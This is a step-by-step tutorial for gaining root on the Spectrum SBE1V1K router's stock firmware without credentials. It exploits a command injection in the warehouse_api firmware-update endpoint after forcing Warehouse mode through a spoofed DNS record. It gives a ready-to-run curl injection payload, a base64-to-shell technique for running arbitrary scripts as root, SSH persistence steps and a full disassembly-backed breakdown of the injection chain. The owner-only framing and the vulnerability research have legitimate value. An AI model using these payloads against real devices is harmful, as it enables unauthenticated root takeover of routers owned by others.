# SBE1V1K Stock Firmware Root Guide (No Disassembly)

## 1. Summary

This tutorial describes a root path for the stock firmware that requires **no disassembly, no serial console, and no credentials**:

- Vulnerability: the `update_firmware` command of the stock web endpoint `/cgi-bin/warehouse_api`. The `firmware` parameter passes through several shell/ELF layers and ends up inside `popen()` — an OS command injection .
- The only no pre-existing credentials: the device must be in **Warehouse mode**. This is achieved simply by controlling the network the device's WAN port boots against (DHCP, IPv6, and one custom DNS record).
- Result: a single HTTPS POST request makes the device start SSH (dropbear) as root. The SSH password is the device serial number in uppercase.
- Verified on stock firmware SCP-5.4.x712.1.41118.1-r22 (OpenWrt 19.07-SNAPSHOT r0+43-ac77edb2e). Every hop of the injection chain was re-checked against source or disassembly; see sections 11 and 13.

This document currently covers only obtaining root on the stock firmware without disassembly, for example to back up the eMMC or study the stock firmware. The post-root flashing procedure is intentionally left blank for now and will be added later.

> Only run this tutorial on devices you own.

## 2. Choosing the Path: Why Command Injection

Three ways of obtaining root were analyzed on this firmware; only the third one works:

| Path | Idea | Verdict |
|---|---|---|
| A. Flash a modified firmware | Patch the rootfs and flash it via `update_firmware` | ❌ Firmware images are U-Boot FIT format with RSA-2048/SHA256 signatures (`/etc/sign.public.key`) plus an ASKEY certificate chain check; without the private key no valid image can be built |
| B. OVSDB injection | Insert records into the `Wifi_Test_Config` table to trigger a `system()` call in the `dm` daemon | ❌ Not a standalone entry point: OVSDB only listens on a Unix socket, which already requires root to write to |
| **C. `update_firmware` command injection** | The `firmware` parameter travels through several shell/ELF layers into `popen()` | ✅ The path used by this tutorial |

The essence of path C: the firmware upgrade flow runs a TFTP command string — built by concatenating user input — through `popen()` (i.e. `/bin/sh -c`).

## 3. Prerequisites

- An SBE1V1K running **stock firmware** (SCP-5.4.x712.1, OpenWrt 19.07-SNAPSHOT).
- A controlled test network providing DHCP (IPv4), IPv6 (SLAAC) and a custom DNS record, connected to the device's **WAN port**.
- A PC to run the commands from (called the *operator PC* below), connected to a **LAN port** of the device.
- Two Ethernet cables.

Overall topology:

```text
Test network ──→ device WAN port    (DHCP/IPv6/DNS, triggers Warehouse mode)
Operator PC  ──→ device LAN port    (web API access, injection, SSH)

Power on → Warehouse mode → one HTTPS POST → SSH connection → root
```

⚠️ Both connections are mandatory:

- WAN only: the device enters Warehouse mode, but the web service does not listen on the WAN side, so the injection cannot be sent.
- LAN only: the web service is reachable, but the device stays in Cloud mode and rejects everything except `get_mode`.

## 4. Step 1: Set Up the Test Network (WAN Port)

At boot, `modecheck.sh` requires the WAN port to obtain both IPv4 (DHCP) and a global IPv6 address (SLAAC), and the DNS must resolve `warehouse.ctdi.local`. Pick any one of the four options below.

### Option A: A regular home router (easiest)

1. Log into the router's admin page and find the DNS settings (may be called "Static DNS", "Hosts", "DNS rebinding", etc.).
2. Add a record: `warehouse.ctdi.local` → `10.0.0.1` (any IP works).
3. Make sure IPv6 is enabled (it usually is by default).
4. Save. Connect router LAN port → SBE1V1K WAN port with an Ethernet cable.

### Option B: An OpenWrt router

```bash
ssh root@<openwrt-router-ip>
uci add_list dhcp.@dnsmasq[0].address="/warehouse.ctdi.local/10.0.0.1"
uci set dhcp.lan.ra="server"          # IPv6 SLAAC, already enabled by default on OpenWrt
uci commit dhcp
/etc/init.d/dnsmasq restart
```

Connect the OpenWrt router's LAN port → SBE1V1K WAN port.

### Option C: A macOS machine

Useful when one Mac acts as the test network source; in that case the Mac needs a second network interface (e.g. a USB Ethernet adapter) on the device's LAN port to also serve as the operator PC — or use a separate PC for that role.

```bash
brew install dnsmasq
cat <<'EOF' >> /opt/homebrew/etc/dnsmasq.conf
interface=en0
bind-interfaces
port=53
dhcp-range=192.168.100.50,192.168.100.100,255.255.255.0,12h
dhcp-option=option:router,192.168.100.1
dhcp-option=option:dns-server,192.168.100.1
address=/warehouse.ctdi.local/10.0.0.1
enable-ra
dhcp-range=::1000,::2000,constructor:en0,ra-stateless,12h
EOF
sudo ifconfig en0 192.168.100.1 netmask 255.255.255.0
sudo dnsmasq -d -C /opt/homebrew/etc/dnsmasq.conf
```

### Option D: A Linux machine

```bash
sudo apt install dnsmasq
cat <<'EOF' | sudo tee -a /etc/dnsmasq.conf
interface=eth0
bind-interfaces
dhcp-range=192.168.100.50,192.168.100.100,12h
dhcp-option=option:router,192.168.100.1
dhcp-option=option:dns-server,192.168.100.1
address=/warehouse.ctdi.local/10.0.0.1
enable-ra
dhcp-range=::1000,::2000,constructor:eth0,ra-stateless,12h
EOF
sudo ip addr add 192.168.100.1/24 dev eth0
sudo ip link set eth0 up
sudo systemctl stop systemd-resolved 2>/dev/null
sudo dnsmasq -d -C /etc/dnsmasq.conf
```

## 5. Step 2: Connect the Operator PC to a LAN Port

**Why it must be LAN:** inside the firmware, the `vm` daemon calls `/sbin/restart_webservice.sh br-home`, so lighttpd only binds to the IP of br-home (the LAN bridge); in `/etc/config/firewall` the WAN zone's input policy is REJECT. The web API is unreachable from the WAN side.

1. Connect the operator PC to any **LAN port** of the SBE1V1K with an Ethernet cable.
2. The device runs its own DHCP server (pool 192.168.1.100–249); the PC usually gets an address automatically.
3. The device's own IP is normally **192.168.1.1**; if not, use whatever default gateway the PC received.
4. If DHCP yields no address, configure 192.168.1.100/24 statically on the PC.
5. Power on the SBE1V1K and wait 2–3 minutes for it to boot.

## 6. Step 3: Verify Warehouse Mode

On the operator PC:

```bash
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_mode'
```

A reply of `Warehouse` means the precondition is met. If it says `Cloud`, go back to section 4 and check the test network: is the DNS record active, and did the WAN port get both IPv4 and IPv6?

## 7. Step 4: Send the Injection and Enable SSH

On the operator PC:

```bash
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=127.0.0.1&firmware=x;/bin/rm${IFS}-f${IFS}/tmp/update_attempt_file${IFS}/tmp/update_firmware_id;/etc/init.d/dropbear${IFS}start;:'
```

Wait from a few seconds to a few minutes (see the timing note in 7.3), then verify that port 22 is open:

```bash
nc -z -v 192.168.1.1 22
```

### 7.1 Payload Walkthrough

| Fragment | Purpose |
|---|---|
| `command=update_firmware` | Triggers the firmware upgrade flow |
| `tftpserver=127.0.0.1` | Any IP works; 127.0.0.1 makes tftp fail fast, so no real TFTP server is needed |
| `firmware=x;...` | `x` is a placeholder filename; everything after `;` is the injected command |
| `${IFS}` | **Replaces spaces**, see 7.2 |
| `/bin/rm -f ...` | Clears the upgrade attempt counters so the trick stays repeatable |
| `/etc/init.d/dropbear start` | Starts the SSH service (the actual goal) |
| Trailing `;:` | `:` is the shell no-op; it absorbs the leftover concatenated arguments |

### 7.2 No Spaces Allowed in the Payload (Important)

One layer of the injection path runs `sscanf("%[^/]/%s", host, path)` (libopensync.so offset 0x175acc). `%s` stops at the first whitespace character — any space in the payload truncates everything after it.

The fix: substitute `${IFS}` for spaces. Before reaching the final `/bin/sh`, `${IFS}` is just plain text (no whitespace, so nothing is truncated); once inside `/bin/sh` it expands to space/tab and performs word splitting.

### 7.3 Timing

The complete command executed by `popen()` is:

```text
timeout 300 tftp -g -r x;rm ...;dropbear start;: -l /tmp/firmware.img 127.0.0.1 69
```

The shell runs it sequentially: `tftp` runs and fails first (there is no TFTP service on 127.0.0.1; usually a few seconds, worst case 300 s), and **only then** do the injected commands run. So SSH may not be reachable the moment curl returns — wait a little and retry.

Also, the retry loop in `fw_utils` executes the same payload multiple times per request (retries=3 → up to 4 runs); running `dropbear start` repeatedly is harmless.

## 8. Step 5: Log in via SSH

The root password is **the device serial number in uppercase**. The serial can be read straight from the API:

```bash
curl -k https://192.168.1.1/cgi-bin/warehouse_api --data 'command=get_serial'
```

Then log in:

```bash
ssh root@192.168.1.1
```

You now have root without opening the case. The post-root flashing procedure will be added later.

## 9. Step 6 (Optional): Persistence

Once logged in over SSH:

```bash
/etc/init.d/dropbear enable                      # start at boot
mkdir -p /etc/dropbear
echo "ssh-ed25519 AAAA...(your public key)..." > /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
```

## 10. Building Your Own Payloads

> Every payload must **contain no spaces** (use `${IFS}` instead) and should end with `;:` to absorb leftover arguments.

### 10.1 Generic Pattern: Base64-Encode Any Script (Recommended)

The base64 alphabet contains neither spaces nor `&`, so it bypasses both limits naturally, while the script itself may contain spaces, `&`, and quotes:

```bash
# 1. Encode any script locally
echo '/etc/init.d/dropbear start
mkdir -p /etc/dropbear
echo "ssh-ed25519 AAAA..." > /etc/dropbear/authorized_keys' | base64 | tr -d '\n'
# yields the BASE64 string

# 2. Send it
curl -k 'https://192.168.1.1/cgi-bin/warehouse_api' \
  --data 'command=update_firmware&tftpserver=127.0.0.1&firmware=x;echo${IFS}<BASE64>|base64${IFS}-d|sh;:'
```

The execution chain is `echo BASE64 | base64 -d | sh`, running the script verbatim. The persistence script from section 9 is a good candidate to send this way.

### 10.2 When the Payload Really Needs a Literal `&`

`warehouse_api` extracts parameters with `[^&]*`, so a literal `&` gets truncated. Two workarounds:

1. Use the base64 pattern (`&` gets encoded inside the base64, never appearing literally).
2. Generate it with command substitution: `$(printf${IFS}"\046")`.

## 11. How the Injection Works (Verified Against the Disassembly)

### 11.1 Full Call Chain

```text
POST firmware=x;CMD
│
├─ /www/cgi-bin/warehouse_api (ash)
│   sed 's/^.*firmware=\([^&]*\).*$/\1/p' extracts the parameter
│   ; $ () ` | are all preserved; only & truncates
│   calls, quoted: /sbin/trigger_update_firmware "3" "x;CMD" "127.0.0.1" &
│
├─ /sbin/trigger_update_firmware (ash), line 94
│   fw_utils --fw_upgrade tftp://$tftp_server/$absolute_image_file $retry_count
│   POSIX rule: tokenization happens before variable expansion → ; stays literal
│   after expansion, "tftp://127.0.0.1/x;CMD" is passed as a single argv
│
├─ fw_utils (ELF) main+0x22c @ 0x4032ec
│   checks strncmp(argv[2], "tftp://", 7) == 0
│   fw_utils_upgrade(argv[2], atoi(argv[3])) @ 0x4062f0
│   retry loop calls osp_upg_dl(url, 300, cb) @ 0x406340
│
└─ libask_osp_upg_dl (libopensync.so) @ 0x1758b8
    ├─ strncmp(url, "tftp://") @ 0x1759bc
    ├─ sscanf(url+7, "%[^/]/%s", host, path) @ 0x175acc
    │   ★ %s truncates at whitespace → no spaces in the payload, use ${IFS} ★
    ├─ snprintf(cmd, 0x400,
    │     "timeout %u tftp -g -r %s -l %s %s %d",
    │     300, path, "/tmp/firmware.img", host, port) @ 0x175ccc
    ├─ popen(cmd, "r") @ 0x175d88   ← injection point
    │   equivalent to /bin/sh -c "timeout 300 tftp -g -r x;CMD -l ..."
    │   the new shell re-parses → ; becomes a command separator → CMD runs as root
    └─ pclose() @ 0x175dbc
```

### 11.2 Usable Shell Metacharacters (re-parsed by the new shell at the popen layer)

| Character | Use | Note |
|---|---|---|
| `;` | Command separator | Preferred |
| `$(...)` | Command substitution | Usable |
| `` ` `` | Command substitution | Usable |
| `\|` | Pipe | Usable |
| `>` `<` | Redirection | Usable |
| Space | Word splitting | **Forbidden** — truncated by sscanf, use `${IFS}` |
| `&` | Background / logical AND | **Forbidden** — truncated by warehouse_api, use base64 or `$(printf${IFS}"\046")` |
| `:` | — | **Forbidden before any `/`** — URL parsing takes the `host:port/path` branch, leaving path empty and killing the whole injection (the base64 alphabet naturally contains no `:`, so it is safe) |

### 11.3 Static Evidence (all extractable from the firmware)

| Evidence | Location |
|---|---|
| `[^&]*` extraction regex | `/www/cgi-bin/warehouse_api` L124–126 |
| Unquoted variable concatenation at L94 | `/sbin/trigger_update_firmware` L94 |
| `osp_upg_dl` / `tftp://` strings | `fw_utils` symbol table and .rodata |
| `sscanf` formats `%[^:]:%d/%s`, `%[^/]/%s` | libopensync.so 0x1c159f / 0x1c15ab |
| `timeout %u tftp -g -r %s -l %s %s %d` | libopensync.so 0x1c160c |
| `popen@plt` call site | libopensync.so 0x175d88 |
| `os_popen` = fork+execl("/bin/sh","sh","-c") | libopensync.so 0x8f290 |
| lighttpd runs without privilege drop (no server.username/procd user) | `/etc/lighttpd/lighttpd.conf`, `/etc/init.d/lighttpd` |
| lighttpd bound to br-home | `/sbin/restart_webservice.sh`, `vm` binary |

## 12. Troubleshooting

| Symptom | Cause and fix |
|---|---|
| curl fails to connect / times out | The operator PC is not on a LAN port, or the device IP is not 192.168.1.1; verify the topology: test network → WAN, operator PC → LAN |
| `get_mode` returns `Cloud` | DNS record not active or WAN missing IPv6; check the test network configuration |
| `get_mode` returns `INVALID_REQUEST` | A method other than POST was used, or the body is empty |
| Port 22 still closed after sending the injection | ① Wait (the tftp part runs first, worst case a few minutes) ② A space slipped into the payload (must use `${IFS}`) ③ An `&` slipped in ④ The attempt counter is exhausted (including `/bin/rm${IFS}-f${IFS}/tmp/update_attempt_file` in the payload fixes it) |
| SSH password rejected | The password is the serial number **in uppercase**; confirm with `get_serial` |
| Second injection has no effect | At most 2 attempts per boot cycle; include the rm counter in the payload, or reboot the device |

## 13. Vulnerability Record and Verification Method

Vulnerability record:

- **Vulnerability class:** CWE-78 OS Command Injection (at the popen layer)
- **Authentication required:** none (`/cgi-bin/warehouse_api` is outside lighttpd's `auth.require` scope)
- **Precondition:** device in Warehouse mode (achievable by controlling the DNS of the network it boots against)
- **Privileges obtained:** root (lighttpd has no privilege-drop configuration)
- **Affected device:** Spectrum SBE1V1K stock firmware
- **Firmware version:** SCP-5.4.x712.1.41118.1-r22 / OpenWrt 19.07-SNAPSHOT r0+43-ac77edb2e

Verification method:

- Shell layer (`warehouse_api`, `trigger_update_firmware`, `modecheck.sh`): read directly as source.
- `fw_utils`, `libopensync.so`: instruction-by-instruction check with objdump disassembly; key addresses are listed in the call chain in 11.1.
- Two issues found and corrected during review:
  1. `sscanf %s` whitespace truncation → the payload switched to `${IFS}`.
  2. lighttpd binds only to br-home and the WAN firewall REJECTs → the topology became a dual connection (WAN to the test network, LAN to the operator PC).
